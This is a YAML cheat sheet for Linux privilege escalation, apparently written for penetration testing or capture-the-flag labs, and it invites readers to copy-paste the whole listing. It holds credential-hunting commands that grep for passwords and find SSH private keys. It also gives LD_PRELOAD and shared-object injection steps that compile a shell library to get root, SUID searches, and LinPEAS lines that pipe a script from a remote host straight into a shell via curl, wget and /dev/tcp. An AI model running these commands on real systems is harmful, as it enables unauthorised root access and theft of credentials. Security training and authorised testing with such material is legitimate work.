---
functions:
  privilege-escalation:
    - description: Simplistic and standard checklist for linux privilege escalation, in no particular order
      code: |
        Feel free to copy paste the entire listing below
        System Info Enum:
        - [ ] uname -a
        - [ ] cat /etc/issue
        - [ ] cat /etc/*-release
        - [ ] cat /proc/version
        - [ ] lsb_release -a
        - [ ] ps aux
        - [ ] lscpu
        - [ ] env
        - [ ] echo $PATH
        - [ ] sudo -l
        - [ ] hostname
        - [ ] mount
        - [ ] dpkg -l
        - [ ] cat /etc/fstab
        - [ ] ssh -V
        - [ ] /bin/lsblk
        - [ ] lsmod
        - [ ] sudo -V

        User Enum:
        - [ ] whoami
        - [ ] id
        - [ ] cat /etc/passwd
        - [ ] cat /etc/group
        - [ ] history

        Network Enum:
        - [ ] ip a
        - [ ] ifconfig
        - [ ] /sbin/route
        - [ ] netstat -plant

        Task Scheduling:
        - [ ] cat /etc/crontab
        - [ ] grep "CRON" /var/log/cron.log
        - [ ] process momintoring (below script)

        Password Hunting:
        - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
        - [ ] locate pass | more
        - [ ] find / -name id_rsa 2>/dev/null
        - [ ] find . -type f -exec grep --color=auto -Hrnwie "PASSWORD" {} 2> /dev/null \;  #search specific folders

        LD_PRELOAD:
        - [ ] sudo -l  #--> is LD_PRELOAD in the sudo permissions?
          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
          gcc -fPIC -shared shell.c -o shell.so -nostartfiles

          sudo LD_PRELOAD=/home/user/shell.so <SUDO BIN>

        SUID:
        - [ ] find / -perm -u=s -type f -ls 2>/dev/null

        SHARED OBJECT INJECTION:
        - [ ] strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
          https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
          gcc -fPIC -shared shell.c -o shell.so -nostartfiles

          run setuid_bin

        File Permission Searching:
        - [ ] find / -type f -perm -2 2>/dev/null | grep -v "^/proc/"                     #world writable
        - [ ] find / -user root -perm -002 -type f 2>/dev/null | grep -v "^/proc/"     #world writable ownd by root
        - [ ] ls -al $(find / -perm -1000 -type d 2>/dev/null)   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
        - [ ] ls -al $(find / -perm -g=s -type f 2>/dev/null)    # SGID (chmod 2000) - run as the group, not the user who started it.
        - [ ] ls -al $(find / -perm -u=s -type f 2>/dev/null)    # SUID (chmod 4000) - run as the owner, not the user who started it.
        - [ ] find / -perm -u=s -type f -ls 2>/dev/null
        - [ ] find / -xdev -user root -perm -o+w -type f 2>/dev/null
        - [ ] find / -xdev -group admin -perm -o+w -type f 2>/dev/null
        
        - [ ] ls -al /etc/iptables/* -R
        - [ ] ls -lah /etc/cron*        

        MONITOR PROCESSES:
        ------------------
        #!/bin/bash
        IFS=$'\n'
        old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
        while true; do
          new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
          diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
          sleep 1
          old_process=$new_process
        done

    - description: LinPeas
      code: |
        curl http://10.10.10.10/linpeas.sh | sh
        cd /tmp; wget http://10.10.10.10/linpeas.sh && sh linpeas.sh

        sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
        cat < /dev/tcp/10.10.10.10/80 | sh #Victim

        # Output to file
        ./linpeas.sh -a > /dev/shm/linpeas.txt

    - description: Linux Exploit Suggester
      code: |
        perl linux-exploit-suggester.pl

          #############################
            Linux Exploit Suggester 2
          #############################

          Local Kernel: 2.6.32
          Searching 72 exploits...

          Possible Exploits
          [1] american-sign-language
              CVE-2010-4347
              Source: http://www.securityfocus.com/bid/45408
          [2] can_bcm
              CVE-2010-2959
              Source: http://www.exploit-db.com/exploits/14814

        ...
        ...

        Use the -k flag to manually enter a wildcard for the kernel/operating system release version.
        perl linux-exploit-suggester.pl -k 3



resources: |
  https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl
  https://github.com/SecWiki/linux-kernel-exploits
  https://github.com/lucyoa/kernel-exploits
  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

---

